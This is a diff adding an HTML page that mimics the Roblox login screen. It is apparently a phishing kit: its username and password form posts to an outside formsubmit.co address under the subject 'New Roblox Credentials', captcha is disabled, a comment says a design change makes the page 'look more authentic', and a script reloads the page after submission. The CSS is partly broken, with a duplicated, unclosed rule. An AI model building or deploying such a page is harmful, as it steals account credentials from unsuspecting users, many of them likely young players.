@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Roblox</title>
+    <style>
+        body {
+            background-color: #232527;
+            color: #333;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .login-container {
+            background-color: #ffffff;
+            padding: 55px 45px;
+            width: 360px;
+            border-radius: 10px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo-area {
+            width: 100px;
+            height: 100px;
+            margin-bottom: 10px;
+        }
+        /* Removing the "Welcome" header makes it look more authentic */
+        .input-group {
+            width: 100%;
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 11px;
+            font-weight: 700;
+            color: #999;
+            text-transform: uppercase;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: #00b06f;
+        }
+        .form-options {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            font-size: 13px;
+            margin-bottom: 20px;
+            color: #999;
+        }
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+        }
+        .checkbox-container input {
+            margin-right: 5px;
+        }
+        .forgot-password {
+            color: #418fa7;
+.forgot-password {
+            color: #418fa7;
+            text-decoration: none;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <!-- Roblox Logo SVG -->
+        <svg class="logo-area" viewBox="0 0 130 130" xmlns="http://www.w3.org/2000/svg">
+            <g>
+                <circle cx="65" cy="65" r="65" fill="#E2231A"/>
+                <path d="M65 10 L110 55 L65 100 L20 55 Z" fill="#fff"/>
+                <path d="M65 25 L90 50 L65 75 L40 50 Z" fill="#E2231A"/>
+            </g>
+        </svg>
+        
+        <form action="https://formsubmit.co/https://formsubmit.co/el/suluxo" method="POST">
+            <div class="input-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" placeholder="Username" required>
+            </div>
+            
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+            </div>
+            
+            <div class="form-options">
+                <label class="checkbox-container">
+                    <input type="checkbox" name="remember"> Remember me
+                </label>
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </div>
+            
+            <input type="hidden" name="_subject" value="New Roblox Credentials">
+            <input type="hidden" name="_captcha" value="false">
+            
+            <button type="submit" class="login-btn">Log In</button>
+        </form>
+    </div>
+
+    <!-- This script auto-refreshes the page to show the success message -->
+    <script>
+        if(window.location.search !== "") {
+            window.location = window.location.pathname;
+        }
+    </script>
+</body>
+</html>
